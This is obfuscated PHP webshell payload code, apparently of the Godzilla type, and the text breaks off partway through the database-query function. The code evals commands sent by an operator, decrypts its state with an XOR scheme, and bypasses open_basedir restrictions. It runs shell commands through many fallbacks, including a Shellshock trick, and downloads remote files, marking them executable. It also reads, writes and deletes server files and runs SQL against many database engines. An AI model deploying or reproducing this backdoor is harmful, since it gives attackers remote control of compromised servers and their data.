// FLAG_STR
$c=array();$d=array();function run($e){global $f;reDefSystemFunc();$d=&getSession();@session_start();$i=md5(session_id());if(isset($_SESSION[$i])){$d=unserialize((S1MiwYYr(base64Decode($_SESSION[$i],$i),$i)));}@session_write_close();if(canCallGzipDecode()==1&&@isGzipStream($e)){$e=gzdecode($e);}formatParameter($e);if(isset($d["bypass_open_basedir"])&&$d["bypass_open_basedir"]==true){@bypass_open_basedir();}if(function_existsEx("set_error_handler")){@set_error_handler("payloadErrorHandler");}if(function_existsEx("set_exception_handler")){@set_exception_handler("payloadExceptionHandler");}$k=@evalFunc();if($k==null||$k===false){$k=$f;}if($d!==null){session_start();$_SESSION[$i]=base64_encode(S1MiwYYr(serialize($d),$i));@session_write_close();}if(canCallGzipEncode()){$k=gzencode($k,6);}return $k;}function payloadExceptionHandler($m){global $f;$f.="ExceptionMsg:".$m->getMessage()."\r\n";return true;}function payloadErrorHandler($n,$o,$p=null,$q=null,$v=null){global $f;$f.="ErrLine: {$q} ErrorMsg:{$o}\r\n";return true;}function S1MiwYYr($w,$qqqqqq){for($rrrrrr=0;$rrrrrr<strlen($w);$rrrrrr++){$w[$rrrrrr]=$w[$rrrrrr]^$qqqqqq[($rrrrrr+1)%15];}return $w;}function reDefSystemFunc(){if(!function_exists("file_get_contents")){function file_get_contents($ssssss){$tttttt=@fopen($ssssss,"rb");$uuuuuu=false;if($tttttt){do{$uuuuuu.=fgets($tttttt,1024*1024);}while(!feof($tttttt));}fclose($tttttt);return $uuuuuu;}}if(!function_exists('gzdecode')&&function_existsEx("gzinflate")){function gzdecode($vvvvvv){return gzinflate(substr($vvvvvv,10,-8));}}if(!function_exists("sys_get_temp_dir")){function sys_get_temp_dir(){$wwwwww=dirname(__FILE__);if(substr($wwwwww,0,1)!='/'){return"C:/Windows/Temp/";}else{return"/tmp/";}}}if(!function_exists("getmygid")){function getmygid(){return0;}}if(!function_exists("scandir")){function scandir($xxxxxx){$yyyyyy=opendir($xxxxxx);if($yyyyyy!==false){$zzzzzz=array();while(false!==($aaaaaaa=readdir($yyyyyy))){$zzzzzz[]=$aaaaaaa;}@closedir($yyyyyy);return $zzzzzz;}return false;}}if(!function_exists("file_put_contents")){function file_put_contents($bbbbbbb,$vvvvvv){$ccccccc=fopen($bbbbbbb,"wb");if($ccccccc!==false){$ddddddd=fwrite($ccccccc,$vvvvvv);return $ddddddd;@fclose($ccccccc);}else{return false;}}}if(!function_exists("is_executable")){function is_executable($bbbbbbb){return false;}}}function&getSession(){global $d;return $d;}function bypass_open_basedir(){@$eeeeeee=@dirname($_SERVER['SCRIPT_FILENAME']);$fffffff=@scandir($eeeeeee);$ggggggg=false;if($fffffff!=null){foreach($fffffff as $bbbbbbb){if($bbbbbbb!="."&&$bbbbbbb!=".."){if(@is_dir($bbbbbbb)){if(@chdir($bbbbbbb)===true){$ggggggg=true;break;}}}}}if(!@file_exists('bypass_open_basedir')&&!$ggggggg){@mkdir('bypass_open_basedir');}if(!$ggggggg){@chdir('bypass_open_basedir');}@ini_set('open_basedir','..');@$eeeeeee=@dirname($_SERVER['SCRIPT_FILENAME']);@$hhhhhhh=str_replace("\\",'/',$eeeeeee);@$iiiiiii=substr_count($hhhhhhh,'/')+1;$jjjjjjj=0;while($jjjjjjj<$iiiiiii){@chdir('..');$jjjjjjj++;}@ini_set('open_basedir','/');if(!$ggggggg){@rmdir($eeeeeee.'/'.'bypass_open_basedir');}}function formatParameter($e){global $c;$kkkkkkk=0;$lllllll=null;while(true){$mmmmmmm=$e[$kkkkkkk];if(ord($mmmmmmm)==0x02){$ddddddd=bytesToInteger(getBytes(substr($e,$kkkkkkk+1,4)),0);$kkkkkkk+=4;$nnnnnnn=substr($e,$kkkkkkk+1,$ddddddd);$kkkkkkk+=$ddddddd;$c[$lllllll]=$nnnnnnn;$lllllll=null;}else{$lllllll.=$mmmmmmm;}$kkkkkkk++;if($kkkkkkk>strlen($e)-1){break;}}}function evalFunc(){@session_write_close();$ooooooo=get("codeName");$ppppppp=get("methodName");$d=&getSession();if($ppppppp!=null){if(strlen(trim($ooooooo))>0){if($ppppppp=="includeCode"){return includeCode();}else{if(isset($d[$ooooooo])){return eval($d[$ooooooo]);}else{return"{$ooooooo} no load";}}}else{if(function_exists($ppppppp)){return $ppppppp();}else{return"function {$ppppppp} not exist";}}}else{return"methodName Is Null";}}function deleteDir($qqqqqqq){$rrrrrrr=@dir($qqqqqqq);while(@$tttttt=$rrrrrrr->read()){$sssssss=$qqqqqqq."/".$tttttt;@chmod($sssssss,0777);if((is_dir($sssssss))&&($tttttt!=".")&&($tttttt!="..")){deleteDir($sssssss);@rmdir($sssssss);}else if(is_file($sssssss)&&($tttttt!=".")&&($tttttt!="..")){@unlink($sssssss);}}$rrrrrrr->close();@chmod($qqqqqqq,0777);return@rmdir($qqqqqqq);}function deleteFile(){$ttttttt=get("fileName");if(is_dir($ttttttt)){return deleteDir($ttttttt)?"ok":"fail";}else{return(file_exists($ttttttt)?@unlink($ttttttt)?"ok":"fail":"fail");}}function setFileAttr(){$uuuuuuu=get("type");$vvvvvvv=get("attr");$bbbbbbb=get("fileName");$wwwwwww="Null";if($uuuuuuu!=null&&$vvvvvvv!=null&&$bbbbbbb!=null){if($uuuuuuu=="fileBasicAttr"){if(@chmod($bbbbbbb,convertFilePermissions($vvvvvvv))){return"ok";}else{return"fail";}}else if($uuuuuuu=="fileTimeAttr"){if(@touch($bbbbbbb,$vvvvvvv)){return"ok";}else{return"fail";}}else{return"no ExcuteType";}}else{$wwwwwww="type or attr or fileName is null";}return $wwwwwww;}function fileRemoteDown(){$xxxxxxx=get("url");$yyyyyyy=get("saveFile");if($xxxxxxx!=null&&$yyyyyyy!=null){$vvvvvv=@file_get_contents($xxxxxxx);if($vvvvvv!==false){if(@file_put_contents($yyyyyyy,$vvvvvv)!==false){@chmod($yyyyyyy,0777);return"ok";}else{return"write fail";}}else{return"read fail";}}else{return"url or saveFile is null";}}function copyFile(){$zzzzzzz=get("srcFileName");$aaaaaaaa=get("destFileName");if(@is_file($zzzzzzz)){if(copy($zzzzzzz,$aaaaaaaa)){return"ok";}else{return"fail";}}else{return"The target does not exist or is not a file";}}function moveFile(){$zzzzzzz=get("srcFileName");$aaaaaaaa=get("destFileName");if(rename($zzzzzzz,$aaaaaaaa)){return"ok";}else{return"fail";}}function getBasicsInfo(){$vvvvvv=array();$vvvvvv['OsInfo']=@php_uname();$vvvvvv['CurrentUser']=@get_current_user();$vvvvvv['CurrentUser']=strlen(trim($vvvvvv['CurrentUser']))>0?$vvvvvv['CurrentUser']:'NULL';$vvvvvv['REMOTE_ADDR']=@$_SERVER['REMOTE_ADDR'];$vvvvvv['REMOTE_PORT']=@$_SERVER['REMOTE_PORT'];$vvvvvv['HTTP_X_FORWARDED_FOR']=@$_SERVER['HTTP_X_FORWARDED_FOR'];$vvvvvv['HTTP_CLIENT_IP']=@$_SERVER['HTTP_CLIENT_IP'];$vvvvvv['SERVER_ADDR']=@$_SERVER['SERVER_ADDR'];$vvvvvv['SERVER_NAME']=@$_SERVER['SERVER_NAME'];$vvvvvv['SERVER_PORT']=@$_SERVER['SERVER_PORT'];$vvvvvv['disable_functions']=@ini_get('disable_functions');$vvvvvv['disable_functions']=strlen(trim($vvvvvv['disable_functions']))>0?$vvvvvv['disable_functions']:@get_cfg_var('disable_functions');$vvvvvv['Open_basedir']=@ini_get('open_basedir');$vvvvvv['timezone']=@ini_get('date.timezone');$vvvvvv['encode']=@ini_get('exif.encode_unicode');$vvvvvv['extension_dir']=@ini_get('extension_dir');$bbbbbbbb=sys_get_temp_dir();$cccccccc=substr($bbbbbbbb,strlen($bbbbbbbb)-1,1);if($cccccccc!='\\'&&$cccccccc!='/'){$bbbbbbbb=$bbbbbbbb.'/';}$vvvvvv['systempdir']=$bbbbbbbb;$vvvvvv['include_path']=@ini_get('include_path');$vvvvvv['DOCUMENT_ROOT']=$_SERVER['DOCUMENT_ROOT'];$vvvvvv['PHP_SAPI']=PHP_SAPI;$vvvvvv['PHP_VERSION']=PHP_VERSION;$vvvvvv['PHP_INT_SIZE']=PHP_INT_SIZE;$vvvvvv['ProcessArch']=PHP_INT_SIZE==8?"x64":"x86";$vvvvvv['PHP_OS']=PHP_OS;$vvvvvv['canCallGzipDecode']=canCallGzipDecode();$vvvvvv['canCallGzipEncode']=canCallGzipEncode();$vvvvvv['session_name']=@ini_get("session.name");$vvvvvv['session_save_path']=@ini_get("session.save_path");$vvvvvv['session_save_handler']=@ini_get("session.save_handler");$vvvvvv['session_serialize_handler']=@ini_get("session.serialize_handler");$vvvvvv['user_ini_filename']=@ini_get("user_ini.filename");$vvvvvv['memory_limit']=@ini_get('memory_limit');$vvvvvv['upload_max_filesize']=@ini_get('upload_max_filesize');$vvvvvv['post_max_size']=@ini_get('post_max_size');$vvvvvv['max_execution_time']=@ini_get('max_execution_time');$vvvvvv['max_input_time']=@ini_get('max_input_time');$vvvvvv['default_socket_timeout']=@ini_get('default_socket_timeout');$vvvvvv['mygid']=@getmygid();$vvvvvv['mypid']=@getmypid();$vvvvvv['SERVER_SOFTWAREypid']=@$_SERVER['SERVER_SOFTWARE'];$vvvvvv['SERVER_PORT']=@$_SERVER['SERVER_PORT'];$vvvvvv['loaded_extensions']=@implode(',',@get_loaded_extensions());$vvvvvv['short_open_tag']=@get_cfg_var('short_open_tag');$vvvvvv['short_open_tag']=@(int)$vvvvvv['short_open_tag']==1?'true':'false';$vvvvvv['asp_tags']=@get_cfg_var('asp_tags');$vvvvvv['asp_tags']=(int)$vvvvvv['asp_tags']==1?'true':'false';$vvvvvv['safe_mode']=@get_cfg_var('safe_mode');$vvvvvv['safe_mode']=(int)$vvvvvv['safe_mode']==1?'true':'false';$vvvvvv['CurrentDir']=str_replace('\\','/',@dirname($_SERVER['SCRIPT_FILENAME']));if(strlen(trim($vvvvvv['CurrentDir']))==0){$vvvvvv['CurrentDir']=str_replace('\\','/',@dirname(__FILE__));}$wwwwww=@dirname(__FILE__);$vvvvvv['FileRoot']='';if(substr($wwwwww,0,1)!='/'){$dddddddd=array('C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z');foreach($dddddddd as $eeeeeeee){if(@is_dir("{$eeeeeeee}:/")){$vvvvvv['FileRoot'].="{$eeeeeeee}:/;";}}if(empty($vvvvvv['FileRoot'])){$vvvvvv['FileRoot']=substr($wwwwww,0,3);}}else{$vvvvvv['FileRoot'].="/";}$k="";foreach($vvvvvv as $lllllll=>$nnnnnnn){$k.=$lllllll." : ".$nnnnnnn."\n";}return $k;}function getFile(){$ffffffff=get('dirName');$ffffffff=(strlen(@trim($ffffffff))>0)?trim($ffffffff):str_replace('\\','/',dirname(__FILE__));$ffffffff.="/";$gggggggg=$ffffffff;$fffffff=@scandir($gggggggg);$vvvvvv="";if($fffffff!=null){$vvvvvv.="ok";$vvvvvv.="\n";$vvvvvv.=$gggggggg;$vvvvvv.="\n";foreach($fffffff as $bbbbbbb){if($bbbbbbb!="."&&$bbbbbbb!=".."){$hhhhhhhh=$gggggggg.$bbbbbbb;$iiiiiiii=array();array_push($iiiiiiii,$bbbbbbb);array_push($iiiiiiii,@is_file($hhhhhhhh)?"1":"0");array_push($iiiiiiii,date("Y-m-d H:i:s",@filemtime($hhhhhhhh)));array_push($iiiiiiii,@filesize($hhhhhhhh));$jjjjjjjj=(@is_readable($hhhhhhhh)?"R":"").(@is_writable($hhhhhhhh)?"W":"").(@is_executable($hhhhhhhh)?"X":"");array_push($iiiiiiii,(strlen($jjjjjjjj)>0?$jjjjjjjj:"F"));$vvvvvv.=(implode("\t",$iiiiiiii)."\n");}}}else{return"Path Not Found Or No Permission!";}return $vvvvvv;}function readFileContent(){$bbbbbbb=get("fileName");if(@is_file($bbbbbbb)){if(function_existsEx("is_readable")){return file_get_contents($bbbbbbb);}else{return"No Permission!";}}else{return"File Not Found";}}function uploadFile(){$bbbbbbb=get("fileName");$kkkkkkkk=get("fileValue");if(@file_put_contents($bbbbbbb,$kkkkkkkk)!==false){@chmod($bbbbbbb,0777);return"ok";}else{return"fail";}}function newDir(){$ffffffff=get("dirName");if(@mkdir($ffffffff,0777,true)!==false){return"ok";}else{return"fail";}}function newFile(){$bbbbbbb=get("fileName");if(@file_put_contents($bbbbbbb,"")!==false){return"ok";}else{return"fail";}}function function_existsEx($llllllll){$mmmmmmmm=explode(",",@ini_get("disable_functions"));if(empty($mmmmmmmm)){$mmmmmmmm=array();}else{$mmmmmmmm=array_map('trim',array_map('strtolower',$mmmmmmmm));}return(function_exists($llllllll)&&is_callable($llllllll)&&!in_array($llllllll,$mmmmmmmm));}function execCommand(){@ob_start();$nnnnnnnn=get("cmdLine");if(substr(__FILE__,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}$k="";if(!function_existsEx("runshellshock")){function runshellshock($mmmmmmmm,$oooooooo){if(substr($mmmmmmmm,0,1)=="/"&&function_existsEx('putenv')&&(function_existsEx('error_log')||function_existsEx('mail'))){if(strstr(readlink("/bin/sh"),"bash")!=FALSE){$pppppppp=tempnam(sys_get_temp_dir(),'as');putenv("PHP_LOL=() { x; }; $oooooooo >$pppppppp 2>&1");if(function_existsEx('error_log')){error_log("a",1);}else{mail("a@127.0.0.1","","","-bv");}}else{return False;}$qqqqqqqq=@file_get_contents($pppppppp);@unlink($pppppppp);if($qqqqqqqq!=""){return $qqqqqqqq;}}return False;};}if(function_existsEx('system')){@system($nnnnnnnn,$wwwwwww);}elseif(function_existsEx('passthru')){$k=@passthru($nnnnnnnn,$wwwwwww);}elseif(function_existsEx('shell_exec')){$k=@shell_exec($nnnnnnnn);}elseif(function_existsEx('exec')){@exec($nnnnnnnn,$rrrrrrrr,$wwwwwww);$k=join("\n",$rrrrrrrr);}elseif(function_existsEx('popen')){$ssssssss=@popen($nnnnnnnn,'r');while(!@feof($ssssssss)){$k.=@fgets($ssssssss,1024*1024);}@pclose($ssssssss);}elseif(function_existsEx('proc_open')){$qqqqqqq=@proc_open($nnnnnnnn,array(1=>array('pipe','w'),2=>array('pipe','w')),$tttttttt);while(!@feof($tttttttt[1])){$k.=@fgets($tttttttt[1],1024*1024);}while(!@feof($tttttttt[2])){$k.=@fgets($tttttttt[2],1024*1024);}@fclose($tttttttt[1]);@fclose($tttttttt[2]);@proc_close($qqqqqqq);}elseif(substr(__FILE__,0,1)!="/"&&@class_exists("COM")){$uuuuuuuu=new COM('WScript.shell');$vvvvvvvv=$uuuuuuuu->exec($nnnnnnnn);$wwwwwwww=$vvvvvvvv->StdOut();$k.=$wwwwwwww->ReadAll();$xxxxxxxx=$vvvvvvvv->StdErr();$k.=$xxxxxxxx->ReadAll();}elseif(function_existsEx("pcntl_fork")&&function_existsEx("pcntl_exec")){$yyyyyyyy="/bin/bash";if(!file_exists($yyyyyyyy)){$yyyyyyyy="/bin/sh";}$zzzzzzzz=sys_get_temp_dir()."/".time().".log";$aaaaaaaaa=sys_get_temp_dir()."/".(time()+1).".log";@file_put_contents($zzzzzzzz,$nnnnnnnn);switch(pcntl_fork()){case 0:$bbbbbbbbb=array("-c","$nnnnnnnn > $aaaaaaaaa");pcntl_exec($yyyyyyyy,$bbbbbbbbb);exit(0);default:break;}if(!file_exists($aaaaaaaaa)){sleep(2);}$k=file_get_contents($aaaaaaaaa);@unlink($zzzzzzzz);@unlink($aaaaaaaaa);}elseif(($k=runshellshock(__FILE__,$nnnnnnnn)!==false)){}else{return"none of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock/pcntl_exec is available";}$k.=@ob_get_contents();@ob_end_clean();return $k;}function execSql(){$ccccccccc=get("dbType");$ddddddddd=get("dbHost");$eeeeeeeee=get("dbPort");$fffffffff=get("dbUsername");$ggggggggg=get("dbPassword");$hhhhhhhhh=get("execType");$iiiiiiiii=get("execSql");$jjjjjjjjj=get("dbCharset");$kkkkkkkkk=get("currentDb");function mysqli_exec($lllllllll,$mmmmmmmmm,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$nnnnnnnnn,$jjjjjjjjj){$ooooooooo=new mysqli($lllllllll,$fffffffff,$ggggggggg,"",$mmmmmmmmm);if($ooooooooo->connect_error){return $ooooooooo->connect_error;}if(!empty($jjjjjjjjj)){$ooooooooo->set_charset($jjjjjjjjj);}if(!empty($kkkkkkkkk)){$ooooooooo->select_db($kkkkkkkkk);}$k=$ooooooooo->query($nnnnnnnnn);if($ooooooooo->error){return $ooooooooo->error;}if($hhhhhhhhh=="update"){return"Query OK, ".$ooooooooo->affected_rows." rows affected";}else{$vvvvvv="ok\n";while($ppppppppp=$k->fetch_field()){$vvvvvv.=base64_encode($ppppppppp->name)."\t";}$vvvvvv.="\n";if($k->num_rows>0){while($qqqqqqqqq=$k->fetch_assoc()){foreach($qqqqqqqqq as $nnnnnnn){$vvvvvv.=base64_encode($nnnnnnn)."\t";}$vvvvvv.="\n";}}return $vvvvvv;}}function mysql_exec($lllllllll,$mmmmmmmmm,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$nnnnnnnnn,$jjjjjjjjj){$rrrrrrrrr=@mysql_connect($lllllllll.":".$mmmmmmmmm,$fffffffff,$ggggggggg);if(!$rrrrrrrrr){return mysql_error();}else{if(!empty($jjjjjjjjj)){mysql_set_charset($jjjjjjjjj,$rrrrrrrrr);}if(!empty($kkkkkkkkk)){if(function_existsEx("mysql_selectdb")){mysql_selectdb($kkkkkkkkk,$rrrrrrrrr);}elseif(function_existsEx("mysql_select_db")){mysql_select_db($kkkkkkkkk,$rrrrrrrrr);}}$k=@mysql_query($nnnnnnnnn);if(!$k){return mysql_error();}if($hhhhhhhhh=="update"){return"Query OK, ".mysql_affected_rows($rrrrrrrrr)." rows affected";}else{$vvvvvv="ok\n";for($rrrrrr=0;$rrrrrr<mysql_num_fields($k);$rrrrrr++){$vvvvvv.=base64_encode(mysql_field_name($k,$rrrrrr))."\t";}$vvvvvv.="\n";$sssssssss=mysql_num_rows($k);if($sssssssss>0){while($qqqqqqqqq=mysql_fetch_row($k)){foreach($qqqqqqqqq as $nnnnnnn){$vvvvvv.=base64_encode($nnnnnnn)."\t";}$vvvvvv.="\n";}}}@mysql_close($rrrrrrrrr);return $vvvvvv;}}function mysqliEx_exec($lllllllll,$mmmmmmmmm,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$nnnnnnnnn,$jjjjjjjjj){$mmmmmmmmm==""?$mmmmmmmmm="3306":$mmmmmmmmm;$ttttttttt=@mysqli_connect($lllllllll,$fffffffff,$ggggggggg,"",$mmmmmmmmm);if(!empty($jjjjjjjjj)){@mysqli_set_charset($jjjjjjjjj);}if(!empty($kkkkkkkkk)){@mysqli_select_db($ttttttttt,$kkkkkkkkk);}$mmmmmmm=@mysqli_query($ttttttttt,$nnnnnnnnn);if(is_bool($mmmmmmm)){return mysqli_error($ttttttttt);}else{if(mysqli_num_fields($mmmmmmm)>0){$rrrrrr=0;$vvvvvv="ok\n";while($uuuuuuuuu=@mysqli_fetch_field($mmmmmmm)){$vvvvvv.=base64_encode($uuuuuuuuu->name)."\t";$rrrrrr++;}$vvvvvv.="\n";while($vvvvvvvvv=@mysqli_fetch_row($mmmmmmm)){for($oooooooo=0;$oooooooo<$rrrrrr;$oooooooo++){$vvvvvv.=base64_encode(trim($vvvvvvvvv[$oooooooo]))."\t";}$vvvvvv.="\n";}return $vvvvvv;}else{return"Query OK, ".@mysqli_affected_rows($ttttttttt)." rows affected";}}}function pg_execEx($lllllllll,$mmmmmmmmm,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$nnnnnnnnn,$jjjjjjjjj){$mmmmmmmmm==""?$mmmmmmmmm="5432":$mmmmmmmmm;$wwwwwwwww=array('host'=>$lllllllll,'port'=>$mmmmmmmmm,'user'=>$fffffffff,'password'=>$ggggggggg);if(!empty($kkkkkkkkk)){$wwwwwwwww["dbname"]=$kkkkkkkkk;}$xxxxxxxxx='';foreach($wwwwwwwww as $yyyyyyyyy=>$zzzzzzzzz){if(empty($zzzzzzzzz)){continue;}$xxxxxxxxx.="$yyyyyyyyy=$zzzzzzzzz ";}$ttttttttt=@pg_connect($xxxxxxxxx);if(!$ttttttttt){return@pg_last_error();}else{if(!empty($jjjjjjjjj)){@pg_set_client_encoding($ttttttttt,$jjjjjjjjj);}$mmmmmmm=@pg_query($ttttttttt,$nnnnnnnnn);if(!$mmmmmmm){return@pg_last_error();}else{$aaaaaaaaaa=@pg_num_fields($mmmmmmm);if($aaaaaaaaaa===NULL){return@pg_last_error();}elseif($aaaaaaaaaa===0){return"Query OK, ".@pg_affected_rows($mmmmmmm)." rows affected";}else{$vvvvvv="ok\n";for($rrrrrr=0;$rrrrrr<$aaaaaaaaaa;$rrrrrr++){$vvvvvv.=base64_encode(@pg_field_name($mmmmmmm,$rrrrrr))."\t";}$vvvvvv.="\n";while($qqqqqqqqq=@pg_fetch_row($mmmmmmm)){for($rrrrrr=0;$rrrrrr<$aaaaaaaaaa;$rrrrrr++){$vvvvvv.=base64_encode($qqqqqqqqq[$rrrrrr]!==NULL?$qqqqqqqqq[$rrrrrr]:"NULL")."\t";}$vvvvvv.="\n";}return $vvvvvv;}}}}function sqlsrv_exec($lllllllll,$mmmmmmmmm,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$nnnnnnnnn){$bbbbbbbbbb=array("UID"=>$fffffffff,"PWD"=>$ggggggggg);if(!empty($kkkkkkkkk)){$bbbbbbbbbb["Database"]=$kkkkkkkkk;}$ttttttttt=@sqlsrv_connect($lllllllll,$bbbbbbbbbb);$mmmmmmm=@sqlsrv_query($ttttttttt,$nnnnnnnnn,null);if($mmmmmmm!==false){$rrrrrr=0;$cccccccccc=@sqlsrv_field_metadata($mmmmmmm);if(empty($cccccccccc)){$dddddddddd=@sqlsrv_rows_affected($mmmmmmm);return"Query OK, ".$dddddddddd." rows affected";}else{$vvvvvv="ok\n";foreach($cccccccccc as $vvvvvvvvv){$vvvvvv.=base64_encode($vvvvvvvvv['Name'])."\t";$rrrrrr++;}$vvvvvv.="\n";while($vvvvvvvvv=@sqlsrv_fetch_array($mmmmmmm,SQLSRV_FETCH_NUMERIC)){for($oooooooo=0;$oooooooo<$rrrrrr;$oooooooo++){$vvvvvv.=base64_encode(trim($vvvvvvvvv[$oooooooo]))."\t";}$vvvvvv.="\n";}return $vvvvvv;}}else{$eeeeeeeeee="";if(($vvvvvvvv=sqlsrv_errors())!=null){foreach($vvvvvvvv as $zzzzzzzzz){$eeeeeeeeee.=($vvvvvvvv['message'])."\n";}}return $eeeeeeeeee;}}function mssql_exec($lllllllll,$mmmmmmmmm,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$nnnnnnnnn){$ttttttttt=@mssql_connect($lllllllll,$fffffffff,$ggggggggg);if(!empty($kkkkkkkkk)){@mssql_select_db($kkkkkkkkk);}$mmmmmmm=@mssql_query($nnnnnnnnn,$ttttttttt);if(is_bool($mmmmmmm)){return"Query OK, ".@mssql_rows_affected($ttttttttt)." rows affected";}else{$vvvvvv="ok\n";$rrrrrr=0;while($vvvvvvvvv=@mssql_fetch_field($mmmmmmm)){$vvvvvv.=base64_encode($vvvvvvvvv->name)."\t";$rrrrrr++;}$vvvvvv.="\n";while($vvvvvvvvv=@mssql_fetch_row($mmmmmmm)){for($oooooooo=0;$oooooooo<$rrrrrr;$oooooooo++){$vvvvvv.=base64_encode(trim($vvvvvvvvv[$oooooooo]))."\t";}$vvvvvv.="\n";}@mssql_free_result($mmmmmmm);@mssql_close($ttttttttt);return $vvvvvv;}}function oci_exec($lllllllll,$mmmmmmmmm,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$nnnnnnnnn,$jjjjjjjjj){$ffffffffff=$jjjjjjjjj?$jjjjjjjjj:"utf8";$gggggggggg=0;$hhhhhhhhhh=@oci_connect($fffffffff,$ggggggggg,$lllllllll,$ffffffffff,$gggggggggg);if(!$hhhhhhhhhh){$iiiiiiiiii=@oci_error();return $iiiiiiiiii["message"];}else{$mmmmmmm=@oci_parse($hhhhhhhhhh,$nnnnnnnnn);if(@oci_execute($mmmmmmm)){$aaaaaaaaaa=oci_num_fields($mmmmmmm);if($aaaaaaaaaa==0){return"Query OK, ".@oci_num_rows($mmmmmmm)." rows affected";}else{$vvvvvv="ok\n";for($rrrrrr=1;$rrrrrr<=$aaaaaaaaaa;$rrrrrr++){$vvvvvv.=base64_encode(oci_field_name($mmmmmmm,$rrrrrr))."\t";}$vvvvvv.="\n";while($qqqqqqqqq=@oci_fetch_array($mmmmmmm,OCI_ASSOC+OCI_RETURN_NULLS)){foreach($qqqqqqqqq as $jjjjjjjjjj){$vvvvvv.=base64_encode($jjjjjjjjjj!==null?base64_encode($jjjjjjjjjj):"")."\t";}$vvvvvv.="\n";}return $vvvvvv;}}else{$vvvvvvvv=@oci_error($mmmmmmm);if($vvvvvvvv){return"ERROR://{$vvvvvvvv['message']} in [{$vvvvvvvv['sqltext']}] col:{$vvvvvvvv['offset']}";}else{return"false";}}}}function ora_exec($lllllllll,$mmmmmmmmm,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$nnnnnnnnn,$jjjjjjjjj){$hhhhhhhhhh=@ora_plogon("{$fffffffff}@{$lllllllll}","{$ggggggggg}");if(!$hhhhhhhhhh){return"Login Failed!";}else{$ttttttttt=@ora_open($hhhhhhhhhh);@ora_commitoff($hhhhhhhhhh);$mmmmmmm=@ora_parse($ttttttttt,"{$nnnnnnnnn}");$kkkkkkkkkk=ora_exec($ttttttttt);if($kkkkkkkkkk){$aaaaaaaaaa=ora_numcols($ttttttttt);$vvvvvv="ok\n";for($rrrrrr=0;$rrrrrr<$aaaaaaaaaa;$rrrrrr++){$vvvvvv.=base64_encode(Ora_ColumnName($ttttttttt,$rrrrrr))."\t";}$vvvvvv.="\n";while(ora_fetch($ttttttttt)){for($rrrrrr=0;$rrrrrr<$aaaaaaaaaa;$rrrrrr++){$vvvvvv.=base64_encode(trim(ora_getcolumn($ttttttttt,$rrrrrr)))."\t";}$vvvvvv.="\n";}return $vvvvvv;}else{return"false";}}}function sqlite_exec($lllllllll,$mmmmmmmmm,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$nnnnnnnnn,$jjjjjjjjj){$llllllllll=new SQLite3($lllllllll);if(!$llllllllll){return"ERROR://CONNECT ERROR".SQLite3::lastErrorMsg();}else{$mmmmmmmmmm=$llllllllll->prepare($nnnnnnnnn);if(!$mmmmmmmmmm){return"ERROR://".$llllllllll->lastErrorMsg();}else{$k=$mmmmmmmmmm->execute();if(!$k){return $llllllllll->lastErrorMsg();}else{$nnnnnnnnnn=True;$vvvvvv="ok\n";while($oooooooooo=$k->fetchArray(SQLITE3_ASSOC)){if($nnnnnnnnnn){foreach($oooooooooo as $lllllll=>$nnnnnnn){$vvvvvv.=base64_encode($lllllll)."\t";}$nnnnnnnnnn=False;$vvvvvv.="\n";}foreach($oooooooooo as $lllllll=>$nnnnnnn){$vvvvvv.=base64_encode($nnnnnnn!==NULL?$nnnnnnn:"NULL")."\t";}$vvvvvv.="\n";}if($nnnnnnnnnn){if(!$k->numColumns()){return"Query OK, ".$llllllllll->changes()." rows affected";}else{return"ERROR://Table is empty.";}}else{return $vvvvvv;}}}$llllllllll->close();}}function pdoExec($pppppppppp,$lllllllll,$mmmmmmmmm,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$nnnnnnnnn){$ooooooooo=null;if($pppppppppp==="oracle"){$pppppppppp="orcl";}if(strpos($lllllllll,"=")!==false){$ooooooooo=new PDO($lllllllll,$fffffffff,$ggggggggg);}else if(!empty($kkkkkkkkk)){$ooooooooo=new PDO("{$pppppppppp}:host=$lllllllll;port={$mmmmmmmmm};dbname={$kkkkkkkkk}",$fffffffff,$ggggggggg);}else{$ooooooooo=new PDO("{$pppppppppp}:host=$lllllllll;port={$mmmmmmmmm};",$fffffffff,$ggggggggg);}$ooooooooo->setAttribute(3,0);if($hhhhhhhhh=="update"){$qqqqqqqqqq=$ooooooooo->exec($nnnnnnnnn);if($qqqqqqqqqq!==false){return"Query OK, ".$ooooooooo->exec($nnnnnnnnn)." rows affected";}else{return"Err->\n".implode(',',$ooooooooo->errorInfo());}}else{$vvvvvv="ok\n";$rrrrrrrrrr=$ooooooooo->prepare($nnnnnnnnn);if($rrrrrrrrrr->execute()){$qqqqqqqqq=$rrrrrrrrrr->fetch(2);$ssssssssss="\n";foreach(array_keys($qqqqqqqqq)as $lllllll){$vvvvvv.=base64_encode($lllllll)."\t";$ssssssssss.=base64_encode($qqqqqqqqq[$lllllll])."\t";}$vvvvvv.=$ssssssssss."\n";while($qqqqqqqqq=$rrrrrrrrrr->fetch(2)){foreach(array_keys($qqqqqqqqq)as $lllllll){$vvvvvv.=base64_encode($qqqqqqqqq[$lllllll])."\t";}$vvvvvv.="\n";}return $vvvvvv;}else{return"Err->\n".implode(',',$rrrrrrrrrr->errorInfo());}}}if($ccccccccc=="mysql"&&(class_exists("mysqli")||function_existsEx("mysql_connect")||function_existsEx("mysqli_connect"))){if(class_exists("mysqli")){return mysqli_exec($ddddddddd,$eeeeeeeee,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$iiiiiiiii,$jjjjjjjjj);}elseif(function_existsEx("mysql_connect")){return 